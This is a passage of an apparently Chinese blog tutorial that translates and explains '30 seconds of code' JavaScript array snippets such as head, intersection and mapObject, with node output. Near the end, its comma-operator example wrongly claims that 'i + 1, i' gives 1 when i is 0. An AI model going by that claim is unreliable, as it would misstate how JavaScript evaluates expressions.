16]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e否则，调用返回该元素对应\u003ccode\u003efunc\u003c/code\u003e属性值方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arr = [\u003cspan class=\"hljs-string\"\u003e'one'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'two'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'three'\u003c/span\u003e];\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e func = \u003cspan class=\"hljs-string\"\u003e'length'\u003c/span\u003e;\narr.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eval\u003c/span\u003e =\u0026gt;\u003c/span\u003e val[func]); \u003cspan class=\"hljs-comment\"\u003e// [3, 3, 5]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003ereduce\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ereduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eacc, val, i\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  acc[val] = (acc[val] || []).concat(arr[i]);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e acc;\n}, {})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eacc\u003c/code\u003e是\u003ccode\u003ereduce\u003c/code\u003e过程中累积的结果，\u003ccode\u003eval\u003c/code\u003e是\u003ccode\u003ereduce\u003c/code\u003e的主体（即前边\u003ccode\u003emap\u003c/code\u003e的结果数组）每次循环时数组元素的值，\u003ccode\u003ei\u003c/code\u003e则是主体数组循环时对应的索引。\u003c/p\u003e\n\u003cp\u003e第一个循环时\u003ccode\u003eacc\u003c/code\u003e的初始值是一个空对象\u003ccode\u003e{}\u003c/code\u003e，循环过程中先判断是否已经有以\u003ccode\u003eval\u003c/code\u003e为键的值，如果还没有，创建一个空数组把此时对应索引\u003ccode\u003ei\u003c/code\u003e的数组值\u003ccode\u003earr[i]\u003c/code\u003e拼接，作为以\u003ccode\u003eval\u003c/code\u003e为键的值；否则，直接拼接\u003ccode\u003earr[i]\u003c/code\u003e。即是\u003ccode\u003eacc[val] = (acc[val] || []).concat(arr[i])\u003c/code\u003e做的事。每次循环都返回\u003ccode\u003eacc\u003c/code\u003e对象，直到循环结束，生成分类结果。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e连起来就是说先对数组\u003ccode\u003earr\u003c/code\u003e元素进行\u003ccode\u003emap\u003c/code\u003e，\u003ccode\u003emap\u003c/code\u003e结果作为键，所有\u003ccode\u003emap\u003c/code\u003e结果相同的数组元素\u003ccode\u003earr[i]\u003c/code\u003e归到一个数组中作为该键的值。最终返回一个分好类的对象。\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003ehead\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReturns the head of a list.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003earr[0]\u003c/code\u003e to return the first element of the passed array.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e head = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e arr[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e];\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e返回数组第一个元素。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003earr[0]\u003c/code\u003e返回指定数组\u003ccode\u003earr\u003c/code\u003e的第一个元素。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat head.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e head = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e arr[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e];\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(head([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e]));\n➜  code node head.js\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003einitial\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReturns all the elements of an array except the last one.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003earr.slice(0,-1)\u003c/code\u003e to return all but the last element of the array.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initial = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e arr.slice(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e返回除数组最后一个元素外的所有元素组成的新数组。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003earr.slice(0, -1)\u003c/code\u003e返回数组除最后一个元素外的所有元素。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat initial.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initial = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e arr.slice(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(initial([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e]));\n➜  code node initial.js\n[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003earr.slice(0, -1)\u003c/code\u003e立竿见影，实在没啥可说。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003einitialize2DArray\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eInitializes a 2D array of given width and height and value.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray.map()\u003c/code\u003e to generate h rows where each is a new array of size w initialize with value. If the value is not provided, default to \u003ccode\u003enull\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initialize2DArray = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ew, h, val = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e(h)\n   .fill()\n   .map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e(w).fill(val));\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e初始化一个给定宽（列）、高（行）和值的二维数组。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eArray.map()\u003c/code\u003e来生成一个\u003ccode\u003eh\u003c/code\u003e行的数组。每一行含有\u003ccode\u003ew\u003c/code\u003e个值为指定值的元素。如果未指定任何值，数组的默认值是\u003ccode\u003enull\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat initialize2DArray.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initialize2DArray = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ew, h, val = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e(h).fill().map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e(w).fill(val));\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(initialize2DArray(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e));\n➜  code node initialize2DArray.js\n[ [ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], [ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eArray(h).fill()\u003c/code\u003e先创建一个含有\u003ccode\u003eh\u003c/code\u003e个元素的数组并将它们全部默认填充为\u003ccode\u003eundefined\u003c/code\u003e。然后在生成的数组基础上，每个数组元素调用一个生成\u003ccode\u003ew\u003c/code\u003e个元素的数组且每个位置的值都填充为\u003ccode\u003eval\u003c/code\u003e方法。这样就生成了\u003ccode\u003eh\u003c/code\u003e行\u003ccode\u003ew\u003c/code\u003e列的二维数组。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003einitializeArrayWithRange\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eInitializes an array containing the numbers in the specified range where \u003ccode\u003estart\u003c/code\u003e and \u003ccode\u003eend\u003c/code\u003e are inclusive.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray((end + 1) - start)\u003c/code\u003e to create an array of the desired length, \u003ccode\u003eArray.map()\u003c/code\u003e to fill with the desired values in a range. You can omit \u003ccode\u003estart\u003c/code\u003e to use a default value of \u003ccode\u003e0\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initializeArrayWithRange = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eend, start = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.from({ \u003cspan class=\"hljs-attr\"\u003elength\u003c/span\u003e: end + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e - start }).map(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ev, i\u003c/span\u003e) =\u0026gt;\u003c/span\u003e i + start);\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e初始化一个包含\u003ccode\u003estart\u003c/code\u003e和\u003ccode\u003eend\u003c/code\u003e的有序数值的数组。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eArray((end + 1) - start)\u003c/code\u003e生成所期望的数组，使用\u003ccode\u003eArray.map()\u003c/code\u003e去填充所期望的有序的数值。若省略\u003ccode\u003estart\u003c/code\u003e，则\u003ccode\u003estart\u003c/code\u003e默认值为\u003ccode\u003e0\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat initializeArrayWithRange.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initializeArrayWithRange = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eend, start = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.from({\n        \u003cspan class=\"hljs-attr\"\u003elength\u003c/span\u003e: end + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e - start\n    }).map(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ev, i\u003c/span\u003e) =\u0026gt;\u003c/span\u003e i + start);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(initializeArrayWithRange(\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e));\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(initializeArrayWithRange(\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e));\n➜  code node initializeArrayWithRange.js\n[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e ]\n[ \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003e{length: end + 1 - start}\u003c/code\u003e生成的数组长度是\u003ccode\u003eend + 1 -start\u003c/code\u003e，而\u003ccode\u003e(v, i) =\u0026gt; i + start\u003c/code\u003e按\u003ccode\u003ei\u003c/code\u003e从\u003ccode\u003e0\u003c/code\u003e开始循环，直到\u003ccode\u003elength - 1\u003c/code\u003e为止。而\u003ccode\u003ei + start\u003c/code\u003e则表示元素值从\u003ccode\u003e0 + start\u003c/code\u003e开始递增。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003einitializeArrayWithValues\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eInitializes and fills an array with the specified values.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray(n)\u003c/code\u003e to create an array of the desired length, \u003ccode\u003efill(v)\u003c/code\u003e to fill it with the desired values. You can omit \u003ccode\u003evalue\u003c/code\u003e to use a default value of \u003ccode\u003e0\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initializeArrayWithValues = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003en, value = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e(n).fill(value);\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e初始化一个数组并全部填充指定值。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eArray(n)\u003c/code\u003e生成期望长度的数组，\u003ccode\u003efill(v)\u003c/code\u003e填充期望的值。若省略第二个参数\u003ccode\u003evalue\u003c/code\u003e，则\u003ccode\u003evalue\u003c/code\u003e默认为\u003ccode\u003e0\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat initializeArrayWithValues.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initializeArrayWithValues = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003en, value = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e(n).fill(value);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(initializeArrayWithValues(\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e));\n➜  code node initializeArrayWithValues.js\n[ \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eArray(n).fill(value)\u003c/code\u003e一步到位，没啥可说的了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eintersection\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReturns a list of elements that exist in both arrays.\u003c/p\u003e\n\u003cp\u003eCreate a \u003ccode\u003eSet\u003c/code\u003e from \u003ccode\u003eb\u003c/code\u003e, then use \u003ccode\u003eArray.filter()\u003c/code\u003e on \u003ccode\u003ea\u003c/code\u003e to only keep values contained in \u003ccode\u003eb\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e intersection = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e s = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eSet\u003c/span\u003e(b);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e a.filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ex\u003c/span\u003e =\u0026gt;\u003c/span\u003e s.has(x));\n};\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e返回两个数组的交集。\u003c/p\u003e\n\u003cp\u003e首先创建一个\u003ccode\u003eb\u003c/code\u003e数组的集合，然后使用\u003ccode\u003eArray.filter()\u003c/code\u003e去筛选出\u003ccode\u003ea\u003c/code\u003e数组中存在于\u003ccode\u003eb\u003c/code\u003e数组中的元素。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat intersection.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e intersection = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e s = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eSet\u003c/span\u003e(b);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e a.filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ex\u003c/span\u003e =\u0026gt;\u003c/span\u003e s.has(x));\n};\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(intersection([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e], [\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e]));\n➜  code node intersection.js\n[ \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003econst s = new Set(b)\u003c/code\u003e先用集合把\u003ccode\u003eb\u003c/code\u003e数组去重，然后\u003ccode\u003ea.filter(x =\u0026gt; s.has(x))\u003c/code\u003e过滤数组\u003ccode\u003ea\u003c/code\u003e，返回所有存在于\u003ccode\u003es\u003c/code\u003e集合中元素组成的数组。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003elast\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReturns the last element in an array.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003earr.length - 1\u003c/code\u003e to compute the index of the last element of the given array and returning it.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e last = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e arr[arr.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e];\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e返回数组的最后一个元素。\u003c/p\u003e\n\u003cp\u003e用\u003ccode\u003earr.length - 1\u003c/code\u003e去计算一个数组最后一个元素的索引值并返回其对应的数组元素。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat last.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e last = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e arr[arr.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e];\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(last([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e]));\n➜  code node last.js\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003emapObject\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eMaps the values of an array to an object using a function, where the key-value pairs consist of the original value as the key and the mapped value.\u003c/p\u003e\n\u003cp\u003eUse an anonymous inner function scope to declare an undefined memory space, using closures to store a return value. Use a new \u003ccode\u003eArray\u003c/code\u003e to store the array with a map of the function over its data set and a comma operator to return a second step, without needing to move from one context to another (due to closures and order of operations).\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e mapObject = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, fn\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n  (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ea\u003c/span\u003e =\u0026gt;\u003c/span\u003e (\n    \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea = [arr, arr.map(fn\u003c/span\u003e)]), \u003cspan class=\"hljs-params\"\u003ea\u003c/span\u003e[0].\u003cspan class=\"hljs-params\"\u003ereduce\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e(acc, val, ind\u003c/span\u003e) =\u0026gt;\u003c/span\u003e ((acc[val] = a[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e][ind]), acc), {})\n  ))();\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e把一个数组调用指定的方法后生成一个对象，对象的键是数组的\u003cstrong\u003e元素值\u003c/strong\u003e，对象的值是该元素值\u003cstrong\u003e调用指定方法后生成的结果\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e使用内部匿名函数定义一个不污染全局变量的命名空间并用闭包存储返回值。使用一个新的数组来存储一个包含\u003ccode\u003earr\u003c/code\u003e数组和\u003ccode\u003earr\u003c/code\u003e数组去\u003ccode\u003emap\u003c/code\u003e指定方法后生成的数组。并在前面数组的基础上借助\u003ccode\u003e,\u003c/code\u003e运算符去一步步的生成所需要的对象。\u003cstrong\u003e避免了上下文环境\u003ccode\u003econtext\u003c/code\u003e来回转换(得益于闭包和运算顺序)。\u003c/strong\u003e \u003cem\u003e(这块不是太懂)\u003c/em\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat mapObject.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e mapObject = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, fn\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n    (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ea\u003c/span\u003e =\u0026gt;\u003c/span\u003e (\n        \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea = [arr, arr.map(fn\u003c/span\u003e)]), \u003cspan class=\"hljs-params\"\u003ea\u003c/span\u003e[0].\u003cspan class=\"hljs-params\"\u003ereduce\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e(acc, val, ind\u003c/span\u003e) =\u0026gt;\u003c/span\u003e ((acc[val] = a[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e][ind]), acc), {})\n    ))();\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e squareIt = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e mapObject(arr, a =\u0026gt; a * a);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(squareIt([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e]));\n➜  code node mapObject.js\n{ \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'2'\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e逗号运算符会返回最后一个运算表达式运算的结果，如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\ni + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, i \u003cspan class=\"hljs-comment\"\u003e// i = 1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即先进行\u003ccode\u003ei + 1\u003c/code\u003e运算，为\u003ccode\u003e1\u003c/code\u003e，然后返回\u003ccode\u003ei\u003c/code\u003e即\u003ccode\u003e1\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e以上代码含有两个逗号运算表达式:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e((acc[val] = a[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e][ind]), acc)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即先做\u003ccode\u003e(acc[val] = a[1][ind])\u003c/code\u003e这个运算，然后返回\u003ccode\u003eacc\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e第二个是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e(a = [arr, arr.map(fn)]), a[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eacc, val, ind\u003c/span\u003e) =\u0026gt;\u003c/span\u003e ((acc[val] = a[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e][ind]), acc), {})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即在\u003ccode\u003ea = [arr, 